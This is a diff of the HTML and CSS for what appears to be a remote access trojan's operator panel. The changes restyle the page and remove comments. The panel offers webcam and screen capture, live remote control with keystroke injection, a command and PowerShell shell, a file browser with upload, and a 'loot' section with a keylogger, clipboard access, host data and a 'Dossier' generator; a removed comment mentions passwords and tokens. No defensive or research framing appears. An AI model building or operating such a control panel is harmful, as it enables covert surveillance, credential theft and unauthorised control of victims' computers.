@@ -4,100 +4,108 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Client</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#0a0c12;--surface:rgba(255,255,255,.04);--border:rgba(255,255,255,.07);--text:#e2e8f0;--text2:rgba(255,255,255,.35);--accent:#818cf8;--green:#22c55e;--red:#ef4444;--orange:#fb923c;--radius:10px}
+:root{--bg:#06090f;--s1:#0d1117;--s2:#161b22;--bdr:#21262d;--t1:#c9d1d9;--t2:#8b949e;--cyan:#00d4ff;--cyan2:rgba(0,212,255,.12);--purple:#a855f7;--purple2:rgba(168,85,247,.12);--green:#3fb950;--red:#f85149;--orange:#d29922;--r:10px}
 html{font-size:14px}
-body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh}
-::-webkit-scrollbar{width:3px}
-::-webkit-scrollbar-track{background:var(--bg)}
-::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:10px}
-::selection{background:rgba(88,100,255,.3);color:#fff}
-.header{position:sticky;top:0;z-index:100;background:rgba(10,12,18,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 1.2rem;display:flex;align-items:center;height:48px;gap:.8rem}
-.header .back{color:var(--text2);text-decoration:none;font-size:1rem;font-weight:700;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:6px;transition:all .15s;flex-shrink:0}
-.header .back:hover{color:#fff;background:rgba(255,255,255,.06)}
-.header h1{color:#f0f4fc;font-size:.85rem;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.header .meta{color:var(--text2);font-size:.68rem;margin-left:auto;white-space:nowrap}
-.main{padding:.6rem 1rem;max-width:1400px;margin:0 auto}
-.tabs{display:flex;gap:.3rem;margin-bottom:.6rem;border-bottom:1px solid var(--border);padding-bottom:.1rem}
-.tab{background:transparent;color:var(--text2);border:none;padding:.3rem.7rem;cursor:pointer;font-size:.78rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .15s;white-space:nowrap}
-.tab:hover{color:rgba(255,255,255,.6);background:rgba(255,255,255,.04)}
-.tab.active{color:var(--accent);background:rgba(88,100,255,.08);box-shadow:inset 0 -1.5px 0 var(--accent)}
-.panel{display:none;animation:pin .2s ease}
-.panel.active{display:block}
-@keyframes pin{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
-.cmd-line{display:flex;gap:.4rem;margin-bottom:.4rem}
-.cmd-line input{flex:1;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:.4rem.7rem;color:var(--text);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.78rem;outline:none}
-.cmd-line input:focus{border-color:rgba(88,100,255,.3)}
-.output{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:.7rem;color:var(--text);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
-.img-out{max-width:100%;border-radius:var(--radius);border:1px solid var(--border);display:block;background:#000}
-.loading{color:var(--text2);text-align:center;padding:2rem;font-size:.8rem}
-.loading .sp{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.06);border-top-color:var(--accent);border-radius:50%;animation:sp .7s linear infinite;margin-right:.5rem;vertical-align:middle}
+body{background:var(--bg);color:var(--t1);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--bdr);border-radius:9px}
+::selection{background:var(--cyan2);color:#fff}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 @keyframes sp{to{transform:rotate(360deg)}}
-.btn{border:none;padding:.3rem.7rem;border-radius:6px;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .12s;display:inline-flex;align-items:center;gap:.3rem;color:#fff}
+
+.header{position:sticky;top:0;z-index:100;background:rgba(6,9,15,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--bdr);padding:0 1.2rem;display:flex;align-items:center;height:50px;gap:.8rem}
+.header .back{color:var(--t2);text-decoration:none;font-size:.9rem;font-weight:700;width:30px;height:30px;display:flex;align-items:center;justify-content:center;border-radius:7px;transition:.2s;flex-shrink:0}
+.header .back:hover{color:var(--cyan);background:var(--cyan2)}
+.header h1{color:#fff;font-size:.88rem;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.header .meta{color:var(--t2);font-size:.68rem;margin-left:auto;white-space:nowrap}
+.main{padding:.7rem 1rem;max-width:1400px;margin:0 auto}
+.tabs{display:flex;gap:.2rem;margin-bottom:.6rem;border-bottom:1px solid var(--bdr);padding-bottom:0}
+.tab{background:transparent;color:var(--t2);border:none;padding:.4rem .8rem;cursor:pointer;font-size:.78rem;font-weight:600;border-radius:8px 8px 0 0;transition:.2s;white-space:nowrap;position:relative}
+.tab:hover{color:var(--t1);background:rgba(255,255,255,.03)}
+.tab.active{color:var(--cyan);background:var(--cyan2)}
+.tab.active::after{content:'';position:absolute;bottom:-1px;left:10%;right:10%;height:2px;background:var(--cyan);border-radius:1px}
+.panel{display:none;animation:fadeUp .2s ease}
+.panel.active{display:block}
+
+.cmd-line{display:flex;gap:.4rem;margin-bottom:.4rem}
+.cmd-line input{flex:1;background:var(--bg);border:1px solid var(--bdr);border-radius:8px;padding:.45rem .7rem;color:var(--t1);font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.78rem;outline:none;transition:.2s}
+.cmd-line input:focus{border-color:var(--cyan);box-shadow:0 0 10px rgba(0,212,255,.1)}
+.output{background:var(--s1);border:1px solid var(--bdr);border-radius:var(--r);padding:.7rem;color:var(--t1);font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.74rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.img-out{max-width:100%;border-radius:var(--r);border:1px solid var(--bdr);display:block;background:#000}
+.loading{color:var(--t2);text-align:center;padding:2rem;font-size:.8rem}
+.loading .sp{display:inline-block;width:14px;height:14px;border:2px solid var(--bdr);border-top-color:var(--cyan);border-radius:50%;animation:sp .7s linear infinite;margin-right:.5rem;vertical-align:middle}
+
+.btn{border:none;padding:.35rem .75rem;border-radius:8px;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.35rem;color:#fff;position:relative;overflow:hidden}
+.btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,transparent,rgba(255,255,255,.1),transparent);transform:translateX(-100%);transition:.4s}
+.btn:hover::before{transform:translateX(100%)}
 .btn:active{transform:scale(.94)}
-.btn-p{background:var(--green)}
-.btn-p:hover{filter:brightness(1.15)}
-.btn-a{background:var(--accent)}
-.btn-a:hover{filter:brightness(1.15)}
-.btn-d{background:var(--red)}
-.btn-d:hover{filter:brightness(1.15)}
-.btn-o{background:var(--orange)}
-.btn-o:hover{filter:brightness(1.15)}
-.btn-g{background:rgba(255,255,255,.06);color:var(--text2);border:1px solid var(--border)}
-.btn-g:hover{background:rgba(255,255,255,.1);color:rgba(255,255,255,.65)}
-.btn.active-on{outline:2px solid var(--accent);outline-offset:2px;background:rgba(88,100,255,.15)!important;border-color:rgba(88,100,255,.3)!important;color:var(--accent)!important}
-.btn-sm{padding:.2rem.45rem;font-size:.68rem}
-.btn-xs{padding:2px 4px;font-size:.55rem;border-radius:3px;background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:all .12s}
-.btn-xs:hover{background:rgba(255,255,255,.1);color:var(--text)}
-.toggle{position:relative;width:36px;height:20px;flex-shrink:0;display:inline-block}
+.btn-p{background:linear-gradient(135deg,var(--green),#2ea043);box-shadow:0 2px 10px rgba(63,185,80,.2)}
+.btn-p:hover{box-shadow:0 4px 18px rgba(63,185,80,.3);transform:translateY(-1px)}
+.btn-a{background:linear-gradient(135deg,var(--cyan),#0099cc);color:#000;box-shadow:0 2px 10px rgba(0,212,255,.2)}
+.btn-a:hover{box-shadow:0 4px 18px rgba(0,212,255,.3);transform:translateY(-1px)}
+.btn-d{background:linear-gradient(135deg,var(--red),#da3633);box-shadow:0 2px 10px rgba(248,81,73,.2)}
+.btn-d:hover{box-shadow:0 4px 18px rgba(248,81,73,.3);transform:translateY(-1px)}
+.btn-o{background:linear-gradient(135deg,var(--orange),#b87d14);box-shadow:0 2px 10px rgba(210,153,34,.2)}
+.btn-o:hover{box-shadow:0 4px 18px rgba(210,153,34,.3);transform:translateY(-1px)}
+.btn-g{background:rgba(255,255,255,.03);color:var(--t2);border:1px solid var(--bdr)}
+.btn-g:hover{background:rgba(255,255,255,.06);color:var(--t1);border-color:rgba(255,255,255,.1)}
+.btn.active-on{outline:2px solid var(--cyan);outline-offset:2px;background:var(--cyan2)!important;border-color:var(--cyan)!important;color:var(--cyan)!important}
+.btn-sm{padding:.22rem .5rem;font-size:.7rem}
+.btn-xs{padding:2px 5px;font-size:.58rem;border-radius:4px;background:rgba(255,255,255,.03);border:1px solid var(--bdr);color:var(--t2);cursor:pointer;transition:.15s}
+.btn-xs:hover{background:var(--cyan2);color:var(--cyan);border-color:rgba(0,212,255,.3)}
+
+.toggle{position:relative;width:38px;height:22px;flex-shrink:0;display:inline-block}
 .toggle input{opacity:0;width:0;height:0}
-.toggle .sl{position:absolute;inset:0;background:rgba(255,255,255,.08);border-radius:10px;cursor:pointer;transition:all .3s}
-.toggle .sl::before{content:'';position:absolute;width:14px;height:14px;left:3px;bottom:3px;background:rgba(255,255,255,.2);border-radius:50%;transition:all .3s}
-.toggle input:checked+.sl{background:rgba(34,197,94,.2)}
-.toggle input:checked+.sl::before{transform:translateX(16px);background:var(--green);box-shadow:0 2px 8px rgba(34,197,94,.3)}
-.bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.35rem.6rem;background:var(--surface);border:1px solid var(--border);border-radius:7px}
-.bar .lb{color:var(--text2);font-size:.65rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
-.bar .sp{color:var(--border)}
-.err{color:#f87171;font-size:.72rem;padding:.35rem.6rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:6px;margin-bottom:.4rem;display:none}
-.sel{background:rgba(0,0,0,.25);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:.2rem.4rem;font-size:.75rem;outline:none;cursor:pointer;font-family:inherit}
-.inp{background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:6px;padding:.25rem.5rem;color:var(--text);font-size:.75rem;outline:none;font-family:inherit}
-.inp:focus{border-color:rgba(88,100,255,.3)}
-.scroll-out{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:.6rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem;min-height:140px;max-height:60vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
-.files{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);min-height:200px;max-height:65vh;overflow-y:auto;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem}
-.files .path{background:rgba(0,0,0,.25);border-bottom:1px solid var(--border);padding:.25rem.6rem;color:var(--accent);display:flex;align-items:center;gap:.4rem;border-radius:var(--radius) var(--radius) 0 0;position:sticky;top:0;z-index:2;font-size:.68rem}
+.toggle .sl{position:absolute;inset:0;background:var(--bdr);border-radius:11px;cursor:pointer;transition:.3s}
+.toggle .sl::before{content:'';position:absolute;width:16px;height:16px;left:3px;bottom:3px;background:var(--t2);border-radius:50%;transition:.3s}
+.toggle input:checked+.sl{background:rgba(0,212,255,.25)}
+.toggle input:checked+.sl::before{transform:translateX(16px);background:var(--cyan);box-shadow:0 0 8px rgba(0,212,255,.4)}
+
+.bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.4rem .65rem;background:var(--s1);border:1px solid var(--bdr);border-radius:8px}
+.bar .lb{color:var(--t2);font-size:.65rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em}
+.bar .sp{color:var(--bdr)}
+.err{color:var(--red);font-size:.72rem;padding:.35rem .6rem;background:rgba(248,81,73,.06);border:1px solid rgba(248,81,73,.15);border-radius:7px;margin-bottom:.4rem;display:none}
+.sel{background:var(--bg);color:var(--t1);border:1px solid var(--bdr);border-radius:7px;padding:.22rem .45rem;font-size:.75rem;outline:none;cursor:pointer;font-family:inherit}
+.inp{background:var(--bg);border:1px solid var(--bdr);border-radius:7px;padding:.28rem .5rem;color:var(--t1);font-size:.75rem;outline:none;font-family:inherit}
+.inp:focus{border-color:var(--cyan)}
+.scroll-out{background:var(--s1);border:1px solid var(--bdr);border-radius:var(--r);padding:.6rem;font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.72rem;min-height:140px;max-height:60vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.files{background:var(--s1);border:1px solid var(--bdr);border-radius:var(--r);min-height:200px;max-height:65vh;overflow-y:auto;font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.72rem}
+.files .path{background:var(--bg);border-bottom:1px solid var(--bdr);padding:.3rem .65rem;color:var(--cyan);display:flex;align-items:center;gap:.4rem;border-radius:var(--r) var(--r) 0 0;position:sticky;top:0;z-index:2;font-size:.68rem}
 .files .path span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.files .entry{padding:.2rem.6rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid rgba(255,255,255,.02);transition:background .08s;font-size:.72rem}
+.files .entry{padding:.22rem .65rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid rgba(255,255,255,.02);transition:.15s;font-size:.72rem}
 .files .entry:last-child{border-bottom:none}
-.files .entry:hover{background:rgba(88,100,255,.04)}
+.files .entry:hover{background:rgba(0,212,255,.03)}
 .files .entry .ico{flex-shrink:0;width:1rem;text-align:center;font-size:.75rem}
 .files .entry .ico.f{color:var(--orange)}
-.files .entry .ico.fl{color:rgba(255,255,255,.2)}
+.files .entry .ico.fl{color:var(--t2);opacity:.3}
 .files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:default}
-.files .entry.dir .nm{cursor:pointer;color:#f0f4fc}
-.files .entry.dir .nm:hover{color:var(--accent)}
-.files .entry .sz{color:var(--text2);font-size:.6rem;white-space:nowrap;min-width:3.5rem;text-align:right}
-.files .entry .dt{color:var(--text2);font-size:.6rem;white-space:nowrap;min-width:6rem;text-align:right}
-.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .1s}
+.files .entry.dir .nm{cursor:pointer;color:#fff}
+.files .entry.dir .nm:hover{color:var(--cyan)}
+.files .entry .sz{color:var(--t2);font-size:.6rem;white-space:nowrap;min-width:3.5rem;text-align:right}
+.files .entry .dt{color:var(--t2);font-size:.6rem;white-space:nowrap;min-width:6rem;text-align:right}
+.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:.15s}
 .files .entry:hover .acts{opacity:1}
-.drop-zone{border:2px dashed var(--border);border-radius:7px;padding:.35rem.6rem;text-align:center;font-size:.68rem;color:var(--text2);margin-bottom:.4rem;transition:all .2s;cursor:pointer;position:relative}
-.drop-zone.drag{border-color:var(--accent);background:rgba(129,140,248,.06);color:var(--accent)}
+.drop-zone{border:2px dashed var(--bdr);border-radius:8px;padding:.4rem .6rem;text-align:center;font-size:.68rem;color:var(--t2);margin-bottom:.4rem;transition:.2s;cursor:pointer;position:relative}
+.drop-zone.drag{border-color:var(--cyan);background:var(--cyan2);color:var(--cyan)}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:.4rem}
-.card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.5rem}
-.card .v{font-size:.9rem;font-weight:700;color:#f0f4fc}
-.card .l{color:var(--text2);font-size:.65rem;margin-top:.05rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
-.disk-bar{height:3px;background:rgba(0,0,0,.3);border-radius:2px;margin-top:.2rem;overflow:hidden}
-.disk-bar .fill{height:100%;background:linear-gradient(90deg,var(--accent),#7c3aed);border-radius:2px;transition:width .4s}
-.toast{position:fixed;bottom:1.2rem;right:1.2rem;background:var(--green);color:#000;padding:.4rem.8rem;border-radius:7px;font-size:.75rem;font-weight:600;z-index:999;animation:tup .25s ease;pointer-events:none}
-@keyframes tup{from{opacity:0;transform:translateY(12px)scale(.95)}to{opacity:1;transform:translateY(0)scale(1)}}
+.card{background:var(--s1);border:1px solid var(--bdr);border-radius:8px;padding:.5rem;transition:.2s}
+.card:hover{border-color:rgba(0,212,255,.15)}
+.card .v{font-size:.9rem;font-weight:700;color:#fff}
+.card .l{color:var(--t2);font-size:.65rem;margin-top:.05rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em}
+.disk-bar{height:3px;background:rgba(255,255,255,.04);border-radius:2px;margin-top:.25rem;overflow:hidden}
+.disk-bar .fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--purple));border-radius:2px;transition:width .4s}
+.toast{position:fixed;bottom:1.2rem;right:1.2rem;background:linear-gradient(135deg,var(--green),#2ea043);color:#fff;padding:.45rem .9rem;border-radius:8px;font-size:.78rem;font-weight:600;z-index:999;animation:fadeUp .25s ease;pointer-events:none;box-shadow:0 4px 18px rgba(63,185,80,.3)}
 .loot-grid{display:grid;grid-template-columns:1fr 1fr;gap:.5rem}
-.loot-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden}
-.loot-card .head{display:flex;align-items:center;justify-content:space-between;padding:.35rem.55rem;border-bottom:1px solid var(--border);font-size:.72rem;font-weight:600;color:var(--text2)}
-.loot-card .head .btn{padding:.15rem.4rem;font-size:.62rem}
-.loot-card .body{padding:.35rem.55rem;min-height:60px;max-height:200px;overflow-y:auto;font-size:.7rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;white-space:pre-wrap;word-break:break-all;line-height:1.35;color:var(--text)}
-.loot-card .body .loading{font-family:'Inter',system-ui,sans-serif}
+.loot-card{background:var(--s1);border:1px solid var(--bdr);border-radius:8px;overflow:hidden;transition:.2s}
+.loot-card:hover{border-color:rgba(0,212,255,.15)}
+.loot-card .head{display:flex;align-items:center;justify-content:space-between;padding:.4rem .6rem;border-bottom:1px solid var(--bdr);font-size:.72rem;font-weight:600;color:var(--t2)}
+.loot-card .head .btn{padding:.15rem .4rem;font-size:.62rem}
+.loot-card .body{padding:.4rem .6rem;min-height:60px;max-height:200px;overflow-y:auto;font-size:.7rem;font-family:'Cascadia Code','Fira Code',Consolas,monospace;white-space:pre-wrap;word-break:break-all;line-height:1.35;color:var(--t1)}
+.loot-card .body .loading{font-family:'Segoe UI',system-ui,sans-serif}
 @media(max-width:768px){
 .header .meta{display:none}.main{padding:.4rem}
 .loot-grid{grid-template-columns:1fr}.files .entry .dt{display:none}
@@ -107,7 +115,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
 </head>
 <body>
 <div class="header">
-  <a class="back" href="index.html">←</a>
+  <a class="back" href="index.html">&larr;</a>
   <h1 id="name">-</h1>
   <div class="meta" id="meta">-</div>
 </div>
@@ -120,7 +128,6 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
     <div class="tab" data-tab="config">CONFIG</div>
   </div>
 
-  <!-- LIVE: Screen + Webcam + Stream + Mouse/Keyboard -->
   <div class="panel active" id="p-live">
     <div class="bar">
       <span class="lb">Captures</span>
@@ -128,14 +135,14 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
       <button class="btn btn-p btn-sm" onclick="takeSS()">Screenshot</button>
       <button class="btn btn-a btn-sm" onclick="takeCam()">Webcam</button>
       <span class="sp">|</span>
-      <button class="btn btn-p btn-sm" id="liveStart" onclick="startLive()">▶ Live</button>
-      <button class="btn btn-d btn-sm" id="liveStop" onclick="stopLive()" style="display:none">■ Stop</button>
-      <span id="fps" style="color:var(--text2);font-size:.65rem;min-width:2.5rem;text-align:right">0 fps</span>
+      <button class="btn btn-p btn-sm" id="liveStart" onclick="startLive()">&#9654; Live</button>
+      <button class="btn btn-d btn-sm" id="liveStop" onclick="stopLive()" style="display:none">&#9632; Stop</button>
+      <span id="fps" style="color:var(--t2);font-size:.65rem;min-width:2.5rem;text-align:right">0 fps</span>
     </div>
     <div class="bar">
       <span class="lb">Quality</span>
-      <input type="range" id="liveQ" min="5" max="50" value="25" style="width:50px;accent-color:var(--accent);height:2px" oninput="lq.textContent=this.value;sendLiveCfg()">
-      <span id="lq" style="color:var(--text2);font-size:.6rem;min-width:1rem">25</span>
+      <input type="range" id="liveQ" min="5" max="50" value="25" style="width:50px;accent-color:var(--cyan);height:2px" oninput="lq.textContent=this.value;sendLiveCfg()">
+      <span id="lq" style="color:var(--t2);font-size:.6rem;min-width:1rem">25</span>
       <span class="lb">Scale</span>
       <select class="sel" id="liveS" style="width:50px" onchange="sendLiveCfg()">
         <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
@@ -149,28 +156,27 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
     </div>
     <div id="keyTypeOut" class="bar" style="display:none;flex-wrap:wrap;gap:3px">
       <input class="inp" id="keyTypeIn" placeholder="Type here..." style="flex:1;min-width:100px;font-size:.72rem" spellcheck="false" oninput="for(let c of this.value)sendKeyType(c);this.value=''">
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(13)">Enter</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(9)">Tab</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(8)">Bksp</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(46)">Del</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(27)">Esc</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(37)">&#9664;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(38)">&#9650;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(39)">&#9654;</button>
-      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 4px" onclick="sendKeySpecial(40)">&#9660;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(13)">Enter</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(9)">Tab</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(8)">Bksp</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(46)">Del</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(27)">Esc</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(37)">&#9664;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(38)">&#9650;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(39)">&#9654;</button>
+      <button class="btn btn-g btn-sm" style="font-size:.55rem;padding:1px 5px" onclick="sendKeySpecial(40)">&#9660;</button>
     </div>
     <div id="liveOut"><div class="loading">Start live or capture</div></div>
     <div id="ssErr" class="err"></div>
     <div id="camErr" class="err"></div>
   </div>
 
-  <!-- SHELL: CMD + Powershell + Processes -->
   <div class="panel" id="p-shell">
     <div class="cmd-line">
       <input id="cmdIn" placeholder="cmd..." onkeydown="if(event.key==='Enter')runCmd()" autofocus spellcheck="false">
       <button class="btn btn-a btn-sm" onclick="runCmd()">Run</button>
-      <button class="btn btn-g btn-sm" onclick="copyCmdOut()" title="Copy">📋</button>
-      <button class="btn btn-g btn-sm" onclick="clrCmd()" title="Clear">✕</button>
+      <button class="btn btn-g btn-sm" onclick="copyCmdOut()" title="Copy">Copy</button>
+      <button class="btn btn-g btn-sm" onclick="clrCmd()" title="Clear">X</button>
     </div>
     <div class="output" id="cmdOut">Ready.</div>
     <div id="cmdErr" class="err"></div>
@@ -180,28 +186,26 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
       <button class="btn btn-a btn-sm" onclick="runPS()">Run PS</button>
       <span class="sp">|</span>
       <span class="lb">Processes</span>
-      <button class="btn btn-p btn-sm" onclick="loadProc()">⟳</button>
+      <button class="btn btn-p btn-sm" onclick="loadProc()">&#8635;</button>
       <input class="inp" id="procSearch" placeholder="Search..." style="flex:1;max-width:150px" oninput="filterProc()" spellcheck="false">
-      <span id="procCnt" style="color:var(--text2);font-size:.65rem"></span>
+      <span id="procCnt" style="color:var(--t2);font-size:.65rem"></span>
     </div>
     <div id="procOut"><div class="loading">Load processes</div></div>
     <div id="procErr" class="err"></div>
   </div>
 
-  <!-- FILES: File browser -->
   <div class="panel" id="p-files">
     <div class="drop-zone" id="dropZ" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
-      <span>Drop files or <a onclick="document.getElementById('fileP').click()" style="color:var(--accent);cursor:pointer">browse</a></span>
+      <span>Drop files or <a onclick="document.getElementById('fileP').click()" style="color:var(--cyan);cursor:pointer">browse</a></span>
       <input type="file" id="fileP" multiple style="display:none" onchange="handleFP(this)">
     </div>
     <div class="files" id="filesB"><div class="loading">Browse a directory</div></div>
     <div id="filesErr" class="err"></div>
   </div>
 
-  <!-- LOOT: Passwords, Tokens, Keylogger, Host, Network, Services, Apps, Clipboard -->
   <div class="panel" id="p-loot">
     <div class="bar">
-      <span class="lb">Extraction Tools</span>
+      <span class="lb">Tools</span>
       <button class="btn btn-p btn-sm" onclick="loadHost()">Host</button>
       <button class="btn btn-a btn-sm" onclick="loadNet()">Network</button>
       <button class="btn btn-g btn-sm" onclick="loadSvc()">Services</button>
@@ -226,7 +230,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
             <button class="btn btn-g btn-sm" onclick="dumpKL()" style="font-size:.6rem">Dump</button>
           </div>
         </div>
-        <div class="head" style="border-top:1px solid var(--border);font-size:.65rem"><span id="klStat" style="color:var(--text2)">Stopped</span></div>
+        <div class="head" style="border-top:1px solid var(--bdr);font-size:.65rem"><span id="klStat" style="color:var(--t2)">Stopped</span></div>
         <div class="body" id="klOut"><div class="loading">Start keylogger</div></div>
         <div id="klErr" class="err"></div>
       </div>
@@ -238,9 +242,9 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
             <button class="btn btn-a btn-sm" onclick="setClip()" style="font-size:.6rem">Set</button>
           </div>
         </div>
-        <div class="head" style="border-top:1px solid var(--border);font-size:.65rem">
+        <div class="head" style="border-top:1px solid var(--bdr);font-size:.65rem">
           <span class="lb">Host Info</span>
-          <button class="btn btn-g btn-sm" onclick="loadEnv()" style="font-size:.6rem">Env Vars</button>
+          <button class="btn btn-g btn-sm" onclick="loadEnv()" style="font-size:.6rem">Env</button>
           <button class="btn btn-g btn-sm" onclick="takeSSAll()" style="font-size:.6rem">All SS</button>
         </div>
         <div id="hostGrid" class="grid" style="display:none;padding:.3rem"></div>
@@ -256,7 +260,6 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
     <div id="appErr" class="err"></div>
   </div>
 
-  <!-- CONFIG: Power + Settings + Dossier + Log -->
   <div class="panel" id="p-config">
     <div class="bar">
       <span class="lb">Power</span>
@@ -266,7 +269,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
       <button class="btn btn-g btn-sm" onclick="sysCmd('logoff')">Logoff</button>
       <span class="sp">|</span>
       <span class="lb">Vol</span>
-      <input type="range" id="volSl" min="0" max="100" value="50" style="width:60px;accent-color:var(--accent);height:2px" oninput="volD.textContent=this.value">
+      <input type="range" id="volSl" min="0" max="100" value="50" style="width:60px;accent-color:var(--cyan);height:2px" oninput="volD.textContent=this.value">
       <span id="volD" style="font-size:.7rem;width:1.5rem">50</span>
       <button class="btn btn-g btn-sm" onclick="sendVol()">Set</button>
       <span class="sp">|</span>
@@ -284,28 +287,28 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
         <div class="head"><span>Dossier</span><button class="btn btn-d btn-sm" id="doxBtn" onclick="runDox()">Generate</button></div>
         <div class="body" style="max-height:none">
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:3px;margin-bottom:6px;font-size:.65rem">
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxHost" checked>Host</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxSys" checked>System</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxNet" checked>Network</label>
